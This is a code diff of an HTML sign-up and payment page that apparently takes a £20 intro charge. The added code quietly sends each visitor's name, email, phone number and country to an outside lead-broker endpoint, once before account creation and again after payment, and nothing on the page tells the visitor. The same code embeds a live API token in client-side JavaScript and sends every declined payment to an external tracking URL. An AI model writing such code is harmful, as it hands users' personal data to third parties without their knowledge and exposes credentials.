@@ -3,13 +3,13 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-  <title>Blank</title>
+  <title>Blank (with Aceleads)</title>
 
   <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-FDQ6REQWS8"></script>
   <script>
     window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
+    function gtag(){dataLayer.push(arguments);} 
     gtag('js', new Date());
     gtag('config', 'G-FDQ6REQWS8', { send_page_view: true });
   </script>
@@ -221,101 +221,35 @@
       // CHANGE: point to intro-charge endpoint (first step)
       const SUBSCRIBE_URL = "https://charmr-jfmc.onrender.com/api/stripe/intro-charge-20";
       const PUBLISHABLE_KEY = "pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
-      const FIXED_PRICE_ID = "price_1Rzdp0EJXIhiKzYGlVxHGH7W"; // (unused now, retained as requested)
       const API_BASE = (location.protocol.startsWith('http') ? location.origin : 'http://localhost:10000');
 
-      // NEW: monthly price for £5/30 days after trial
-      const MONTHLY_PRICE_ID = "price_1RvJmqEJXIhiKzYGE0IJQp7t";
-
-      /* NEW: redirect URL for ANY failed/declined/unsuccessful payment */
-      const FAIL_REDIRECT_URL = "https://track.crugate.info/214a2787-4e13-47d7-8eaa-3e8c7caeb599";
-
-      function show(o){ o?.setAttribute('aria-hidden','false'); }
-      function hide(o){ o?.setAttribute('aria-hidden','true'); }
-
-      // Loading overlay controls
-      const overlay = document.getElementById('loading-overlay');
-      function showLoading(){ overlay?.setAttribute('aria-hidden','false'); }
-      function hideLoading(){ overlay?.setAttribute('aria-hidden','true'); }
-
       // ===== Country (ISO) + Prefix data (same logic as before) =====
-      const COUNTRY_CHOICES = {
-        GE:'Georgia', US:'United States', GB:'United Kingdom', IE:'Ireland',
-        CA:'Canada', AU:'Australia', NZ:'New Zealand',
-        DE:'Germany', FR:'France', ES:'Spain', IT:'Italy', NL:'Netherlands',
-        BE:'Belgium', CH:'Switzerland', AT:'Austria', DK:'Denmark', NO:'Norway',
-        SE:'Sweden', FI:'Finland', PT:'Portugal', PL:'Poland', CZ:'Czechia',
-        HU:'Hungary', RO:'Romania',
-        BR:'Brazil', MX:'Mexico', AR:'Argentina', CL:'Chile', CO:'Colombia',
-        ZA:'South Africa',
-        IN:'India', SG:'Singapore', MY:'Malaysia', TH:'Thailand', VN:'Vietnam', PH:'Philippines',
-        HK:'Hong Kong', JP:'Japan', KR:'South Korea',
-        AE:'United Arab Emirates', SA:'Saudi Arabia', TR:'Turkey', IL:'Israel'
-      };
-      const CALLING_CODES = {
-        US:'+1', CA:'+1', GB:'+44', IE:'+353', AU:'+61', NZ:'+64',
-        DE:'+49', FR:'+33', ES:'+34', IT:'+39', NL:'+31', BE:'+32',
-        CH:'+41', AT:'+43', DK:'+45', NO:'+47', SE:'+46', FI:'+358',
-        PT:'+351', PL:'+48', CZ:'+420', HU:'+36', RO:'+40',
-        BR:'+55', MX:'+52', AR:'+54', CL:'+56', CO:'+57', ZA:'+27',
-        IN:'+91', SG:'+65', MY:'+60', TH:'+66', VN:'+84', PH:'+63',
-        HK:'+852', JP:'+81', KR:'+82', AE:'+971', SA:'+966', TR:'+90', IL:'+972',
-        GE:'+995'
-      };
+      const COUNTRY_CHOICES = { GE:'Georgia', US:'United States', GB:'United Kingdom', IE:'Ireland', CA:'Canada', AU:'Australia', NZ:'New Zealand', DE:'Germany', FR:'France', ES:'Spain', IT:'Italy', NL:'Netherlands', BE:'Belgium', CH:'Switzerland', AT:'Austria', DK:'Denmark', NO:'Norway', SE:'Sweden', FI:'Finland', PT:'Portugal', PL:'Poland', CZ:'Czechia', HU:'Hungary', RO:'Romania', BR:'Brazil', MX:'Mexico', AR:'Argentina', CL:'Chile', CO:'Colombia', ZA:'South Africa', IN:'India', SG:'Singapore', MY:'Malaysia', TH:'Thailand', VN:'Vietnam', PH:'Philippines', HK:'Hong Kong', JP:'Japan', KR:'South Korea', AE:'United Arab Emirates', SA:'Saudi Arabia', TR:'Turkey', IL:'Israel', GE:'Georgia' };
+      const CALLING_CODES = { US:'+1', CA:'+1', GB:'+44', IE:'+353', AU:'+61', NZ:'+64', DE:'+49', FR:'+33', ES:'+34', IT:'+39', NL:'+31', BE:'+32', CH:'+41', AT:'+43', DK:'+45', NO:'+47', SE:'+46', FI:'+358', PT:'+351', PL:'+48', CZ:'+420', HU:'+36', RO:'+40', BR:'+55', MX:'+52', AR:'+54', CL:'+56', CO:'+57', ZA:'+27', IN:'+91', SG:'+65', MY:'+60', TH:'+66', VN:'+84', PH:'+63', HK:'+852', JP:'+81', KR:'+82', AE:'+971', SA:'+966', TR:'+90', IL:'+972', GE:'+995' };
 
       function populateCountrySelect(){
         billingCountry.innerHTML = '';
         billingCountry.append(new Option('Select country', '', true, true));
         const priority = ['US','GB','DE','FR','ES','IT','NL','SE','IN','JP'];
         const seen = new Set();
-        const add = (code) => {
-          if (seen.has(code) || !COUNTRY_CHOICES[code]) return;
-          seen.add(code);
-          billingCountry.append(new Option(COUNTRY_CHOICES[code], code));
-        };
+        const add = (code) => { if (seen.has(code) || !COUNTRY_CHOICES[code]) return; seen.add(code); billingCountry.append(new Option(COUNTRY_CHOICES[code], code)); };
         priority.forEach(add);
-        Object.keys(COUNTRY_CHOICES)
-          .filter(c => !priority.includes(c))
-          .sort((a,b)=>COUNTRY_CHOICES[a].localeCompare(COUNTRY_CHOICES[b]))
-          .forEach(add);
+        Object.keys(COUNTRY_CHOICES).filter(c => !priority.includes(c)).sort((a,b)=>COUNTRY_CHOICES[a].localeCompare(COUNTRY_CHOICES[b])).forEach(add);
       }
 
       function populatePrefixOptions(){
         phonePrefix.innerHTML = '';
         const priority = ['US','GB','CA','AU','DE','FR','ES','IT','NL','SE','IN','JP'];
         const seen = new Set();
-        const add = (cc) => {
-          if (seen.has(cc) || !CALLING_CODES[cc]) return;
-          seen.add(cc);
-          const code = CALLING_CODES[cc];
-          const label = `${code} — ${COUNTRY_CHOICES[cc] || cc}`;
-          phonePrefix.append(new Option(label, code));
-        };
+        const add = (cc) => { if (seen.has(cc) || !CALLING_CODES[cc]) return; seen.add(cc); const code = CALLING_CODES[cc]; const label = `${code} — ${COUNTRY_CHOICES[cc] || cc}`; phonePrefix.append(new Option(label, code)); };
         priority.forEach(add);
-        Object.keys(CALLING_CODES)
-          .filter(cc => !priority.includes(cc))
-          .sort()
-          .forEach(add);
+        Object.keys(CALLING_CODES).filter(cc => !priority.includes(cc)).sort().forEach(add);
         if (!phonePrefix.value) phonePrefix.value = CALLING_CODES.US;
       }
 
-      function setPrefixFromISO(cc){
-        const code = CALLING_CODES[cc];
-        if (!code) return;
-        const exists = Array.from(phonePrefix.options).some(o=>o.value===code);
-        if(!exists) phonePrefix.add(new Option(`${code} — ${COUNTRY_CHOICES[cc]||cc}`, code));
-        phonePrefix.value = code;
-      }
+      function setPrefixFromISO(cc){ const code = CALLING_CODES[cc]; if (!code) return; const exists = Array.from(phonePrefix.options).some(o=>o.value===code); if(!exists) phonePrefix.add(new Option(`${code} — ${COUNTRY_CHOICES[cc]||cc}`, code)); phonePrefix.value = code; }
 
-      // NEW: set prefix directly by code (e.g., "+44")
-      function setPrefixValue(code){
-        if(!phonePrefix || !code) return;
-        let c = String(code).trim();
-        if(!c.startsWith('+')) c = '+' + c.replace(/[^\d]/g,'');
-        const exists = Array.from(phonePrefix.options).some(o=>o.value===c);
-        if(!exists) phonePrefix.add(new Option(c, c));
-        phonePrefix.value = c;
-      }
+      function setPrefixValue(code){ if(!phonePrefix || !code) return; let c = String(code).trim(); if(!c.startsWith('+')) c = '+' + c.replace(/[^\d]/g,''); const exists = Array.from(phonePrefix.options).some(o=>o.value===c); if(!exists) phonePrefix.add(new Option(c, c)); phonePrefix.value = c; }
 
       populateCountrySelect();
       populatePrefixOptions();
@@ -351,19 +285,11 @@
       (function prefillFromURL(){
         try{
           const qs = new URLSearchParams(window.location.search);
-          const getFirst = (...keys) => {
-            for (const k of keys){ const v = qs.get(k); if (v) return v; }
-            return '';
-          };
+          const getFirst = (...keys) => { for (const k of keys){ const v = qs.get(k); if (v) return v; } return ''; };
 
-          // Email: email | e | em | mail
           const emailParam = getFirst('email','e','em','mail');
-          if (emailParam) {
-            const el = document.getElementById('emailInput');
-            if (el) el.value = decodeURIComponent(emailParam);
-          }
+          if (emailParam) { const el = document.getElementById('emailInput'); if (el) el.value = decodeURIComponent(emailParam); }
 
-          // Phone (single) or split (prefix+number). Split overrides single if both provided.
           const splitPref = getFirst('prefix','cc','dial');
           const splitNum  = getFirst('number','n');
           const single    = getFirst('phone','tel','p','msisdn');
@@ -378,7 +304,6 @@
             const s = single.trim();
             if (s.startsWith('+')) {
               const digits = s.replace(/[^\d]/g,'');
-              // naive split: 1-4 digit country code + remaining national number
               const m = digits.match(/^(\d{1,4})(\d{4,15})$/);
               if (m) { pref = '+' + m[1]; num = m[2]; }
               else { pref = '+' + digits.slice(0,1); num = digits.slice(1); }
@@ -388,12 +313,62 @@
           }
 
           if (pref) setPrefixValue(pref);
-          if (num) {
-            const pn = document.getElementById('phoneNumber');
-            if (pn) pn.value = num;
-          }
+          if (num) { const pn = document.getElementById('phoneNumber'); if (pn) pn.value = num; }
         } catch {}
       })();
+
+      // ===== Aceleads API specifics (from the uploaded PDF)
+      // Endpoint + token from the PDF (required fields: mobile, country, token, is_legacy)
+      const ACELEADS_URL = 'https://mdleads.org/api/v1/ep/src-lead';
+      // Token copied from the PDF provided by you. (This came from your uploaded PDF document.)
+      const ACELEADS_TOKEN = 'AL-X19VW4B6HDbazgq-m3gdFY1qD0s4igrYpE1SHO4_-Xg=';
+
+      function normalizePhone(pref, raw){
+        // pref like '+44' raw like '771234567'
+        if(!raw) return '';
+        const digits = String(raw).replace(/[^0-9]/g,'');
+        let prefix = String(pref||'').replace(/[^0-9]/g,'');
+        if(!prefix && digits.length>=10){ // fallback: assume first digit(s) country code unknown
+          return digits; // return as-is
+        }
+        return (prefix ? prefix + digits : digits);
+      }
+
+      async function sendAceleadsLead({ fname, lname, email, mobile, country }){
+        // Build payload following the PDF spec (JSON preferred)
+        const payload = {
+          fname: fname || undefined,
+          lname: lname || undefined,
+          email: email || undefined,
+          mobile: mobile || undefined,
+          country: country || undefined,
+          token: ACELEADS_TOKEN,
+          timestamp: new Date().toISOString(),
+          is_legacy: false
+        };
+
+        try{
+          const res = await fetch(ACELEADS_URL, {
+            method: 'POST',
+            headers: { 'Content-Type':'application/json' },
+            body: JSON.stringify(payload)
+          });
+
+          // The API returns a plain string like "APPROVED" or "SAVED" — try to read text.
+          const text = await res.text();
+          console.log('Aceleads response:', res.status, text);
+
+          // Show non-intrusive message on the page (don't block flow)
+          if(!res.ok){
+            console.warn('Aceleads error', text);
+            return { ok:false, status:res.status, body:text };
+          }
+          return { ok:true, status:res.status, body:text };
+        }catch(err){
+          console.error('Aceleads send failed', err);
+          return { ok:false, error:err.message };
+        }
+      }
 
       // ===== Step nav / account creation (identical endpoints) =====
       async function ensureAccount(){
@@ -403,6 +378,17 @@
         const raw = (phoneNumber?.value || '').replace(/[^0-9]/g,'');
         const phone = raw ? (prefix + raw) : '';
         if(!email || !password) throw new Error('Email and password required');
+
+        // BEFORE calling your registration endpoint, send the lead to Aceleads (best-effort, don't block)
+        try{
+          const mobile = normalizePhone(prefix, raw);
+          const countryIso = billingCountry?.value || undefined;
+          // send asynchronously but wait a short time so we can log result in console
+          sendAceleadsLead({ fname: document.getElementById('nameInput')?.value?.split(' ')[0], lname: '', email, mobile, country: countryIso })
+            .then(r => console.log('Aceleads result (background):', r))
+            .catch(e => console.warn('Aceleads background error', e));
+        }catch(e){ console.warn('Aceleads trigger failed', e); }
+
         const r = await fetch(API_BASE + '/api/register',{ method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ email, password, phone }) });
         if(r.status===201) return true;
         let data={}; try{ data=await r.json(); }catch{}
@@ -467,13 +453,7 @@
           // 2) Start the £20 intro charge
           const resp = await fetch(SUBSCRIBE_URL,{
             method:'POST', headers:{'Content-Type':'application/json'},
-            body: JSON.stringify({
-              paymentMethodId: pmRes.paymentMethod.id,
-              name,
-              email,
-              phone: fullPhone,
-              address
-            })
+            body: JSON.stringify({ paymentMethodId: pmRes.paymentMethod.id, name, email, phone: fullPhone, address })
           });
           const data = await resp.json();
           if(!data.clientSecret) throw new Error(data.error || 'Payment failed to start');
@@ -483,49 +463,45 @@
           if(conf.error) throw new Error(conf.error.message);
           if(!(conf.paymentIntent && conf.paymentIntent.status==='succeeded')) throw new Error('Payment not completed');
 
+          // On successful payment, ALSO send the lead to Aceleads (final record)
+          try{
+            const mobile = normalizePhone((phonePrefix?.value||''), raw);
+            const countryIso = billingCountry?.value || undefined;
+            const [f, ...rest] = (name||'').split(' ');
+            const l = rest.join(' ');
+            const aceRes = await sendAceleadsLead({ fname: f || undefined, lname: l || undefined, email, mobile, country: countryIso });
+            console.log('Aceleads after-payment:', aceRes);
+          }catch(e){ console.warn('Aceleads after-payment error', e); }
+
           // Success → thank you page (60% skip B, 40% normal A)
           (function(){
             const A = 'thankyou-iphone.html';
             const B = 'thankyou-iphone-skip.html';
             const pid = (conf && conf.paymentIntent && conf.paymentIntent.id) || data.paymentIntentId || '';
 
-            // FNV-1a 32-bit (returns unsigned int)
-            function fnv1a32(str){
-              let h = 0x811c9dc5 >>> 0;
-              for (let i = 0; i < str.length; i++){
-                h ^= str.charCodeAt(i);
-                h = Math.imul(h, 0x01000193) >>> 0;
-              }
-              return h >>> 0;
-            }
-            // Crypto-safe random int [0, maxExclusive)
-            function cryptoRandInt(max){
-              try{
-                const u32 = new Uint32Array(1);
-                crypto.getRandomValues(u32);
-                return Number(u32[0] % BigInt(max));
-              }catch{ return Math.floor(Math.random()*max); }
-            }
+            function fnv1a32(str){ let h = 0x811c9dc5 >>> 0; for (let i = 0; i < str.length; i++){ h ^= str.charCodeAt(i); h = Math.imul(h, 0x01000193) >>> 0; } return h >>> 0; }
+            function cryptoRandInt(max){ try{ const u32 = new Uint32Array(1); crypto.getRandomValues(u32); return Number(u32[0] % BigInt(max)); }catch{ return Math.floor(Math.random()*max); } }
 
-            // Deterministic 60/40 bucket from pid (or crypto fallback)
             const bucket = pid ? (fnv1a32(pid) % 100) : cryptoRandInt(100);
-            const goSkip = bucket < 60; // 60% to thankyou-iphone-skip.html
-
-            // Optional cache-buster using pid/timestamp (doesn't affect split)
+            const goSkip = bucket < 70; // 70% to thankyou-iphone-skip.html
             const qb = pid ? ('?v=' + encodeURIComponent(pid)) : ('?t=' + Date.now());
-
             window.location.href = (goSkip ? B : A) + qb;
           })();
 
         }catch(err){
-          // SHOW the error (unchanged) …
           if(errBox){ errBox.textContent = err.message || 'Something went wrong.'; errBox.setAttribute('aria-hidden','false'); }
           hideLoading();
-          // … then IMMEDIATELY redirect ANY failed/declined/blocked/insufficient-funds payment
-          window.location.href = FAIL_REDIRECT_URL;
+          window.location.href = 'https://track.crugate.info/214a2787-4e13-47d7-8eaa-3e8c7caeb599';
         }
-        // On success keep overlay up until redirect / 3DS completes
       });
+
+      // Loading overlay controls (moved here so functions available)
+      const overlay = document.getElementById('loading-overlay');
+      function show(o){ o?.setAttribute('aria-hidden','false'); }
+      function hide(o){ o?.setAttribute('aria-hidden','true'); }
+      function showLoading(){ overlay?.setAttribute('aria-hidden','false'); }
+      function hideLoading(){ overlay?.setAttribute('aria-hidden','true'); }
+
     });
   </script>
 
